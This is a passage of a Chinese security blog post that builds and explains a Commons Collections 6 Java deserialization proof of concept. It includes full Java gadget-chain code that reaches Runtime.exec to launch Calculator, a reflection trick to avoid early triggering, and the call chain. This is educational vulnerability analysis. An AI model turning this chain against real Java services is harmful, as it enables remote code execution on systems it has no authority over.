+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; objcc6 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">objcc6.put(tiedMapEntry,<span class="string">&quot;asd&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>写到这里，直接进行序列化的阶段就会直接触发了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.ccChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/8/6 10:58 上午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; objcc6 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        objcc6.put(tiedMapEntry,<span class="string">&quot;asd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(objcc6);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>( <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>( <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="RaC2RUbTqHIRx3C93PzaO1ajXLmG2i-m7SxXSSAYmJA.png" alt="image"></p>
+<p>因为在put的时候就调用了hash对key进行hash，从而就直接触发我们构造的链了。</p>
+<p><img src="Ryhb3ypacdm_6dKf7RMigHeZpMBimfeR1Vp-SM1-2t4.png" alt="image"></p>
+<p> 捋一下现在的情况是，tiedMapEntry里面套着一个lazyMap，lazyMap里面套这一个chainedTransformer，chainedTransformer里面套着transformer。这几个里面可以把任意一个修改为空的就行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tiedMapEntry---lazyMap---chainedTransformer---transformer</span><br></pre></td></tr></table></figure>
+<p>这里我们通过反射修改lazyMap为空。</p>
+<p>我们一开始序列化的时候给map先传入的是没用的chainedTransformer(1)，然后再传入的是执行命令的chainedTransformer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(<span class="number">1</span>));        </span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure>
+<p><img src="gHWHqBWjaYhVwliZ0EdV79aBR-oCDvRd3GOpbJwOYrQ.png" alt="image"></p>
+<p>进行序列化和反序列化，发现还是没能执行成功。</p>
+<p><img src="UEdzKBjDnnQnsWPzS4xLqu3xmrigif5GFoiV6Qu_pD8.png" alt="image"></p>
+<p>我们分析一下看看；当进行put的时候，就调用了hash</p>
+<p><img src="YwpIQGRQ2SMpl3PxizuAak4rMD2IxFHroBx70Af-6AQ.png" alt="image"></p>
+<p>紧接着就是hashcode</p>
+<p><img src="251Yg7En3NZ5U1nmf99Mj1IyXiG5QA0zoSE2cR8dnBk.png" alt="image"></p>
+<p>然后就到tiedMapEntry的hashcode</p>
+<p><img src="tGhMaRFX5eChkitCRb0Ym8W-IZdMqm1Uzdmak69YcCw.png" alt="image"></p>
+<p>然后我们看到在get里面调用完transform之后就会把key又put进去。</p>
+<p><img src="yBfAIumMqn3dOY4h61bDGPSJTVme14HPbVQTtcHrkU8.png" alt="image"></p>
+<p>也就是说反序列化的时候就有这个key了，所以我们需要把它移出来（删掉）即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.remove(<span class="string">&quot;qwe&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>最终的代码为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.ccChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/8/6 10:58 上午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; objcc6 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        objcc6.put(tiedMapEntry,<span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;qwe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(objcc6);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>( <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>( <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="ChqoiGgI-tpoewpSFiHYgtmV_H9vhJvQTLi1YHnI6yw.png" alt="image"></p>
+<p>完整的调用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashSet.readObject()</span><br><span class="line">        java.util.HashMap.put()</span><br><span class="line">        java.util.HashMap.hash()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                    org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                    java.lang.reflect.Method.invoke()</span><br><span class="line">                        java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
+<p><img src="JIBdTEcBguto3gH8-99V-35YAGa7x4tLUE_vQJUE0FM.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.本文先是以另一种形式实现了cc1，主要是为后面cc6也用到lazyMap做铺垫</p>
+<p>2.分析了cc1的修复方式之后，使用TiedMapEntry结合URLDNS链的来实现cc6</p>
+<p>3.为了避免在序列化就触发，所以修改了传入map的Transformer，先传入一个没用的，然后再传入一个正常的；通过反射修改lazy传入的为空</p>
+<p>4.发现反序列化的时候没能成功执行，分析得知是TiedMapEntry还会把key put进去，移除后即可</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">Java安全之cc6链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E7%9A%84cc1"><span class="toc-number">1.2.</span> <span class="toc-text">新的cc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B0%E7%9A%84cc1"><span class="toc-number">1.3.</span> <span class="toc-text">实现新的cc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cc1%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">cc1修复分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">CC6分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0cc6-poc"><span class="toc-number">1.6.</span> <span class="toc-text">构造cc6 poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&text=Java安全之cc6链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&is_video=false&description=Java安全之cc6链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全之cc6链&body=Check out this article: https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&name=Java安全之cc6链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&t=Java安全之cc6链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
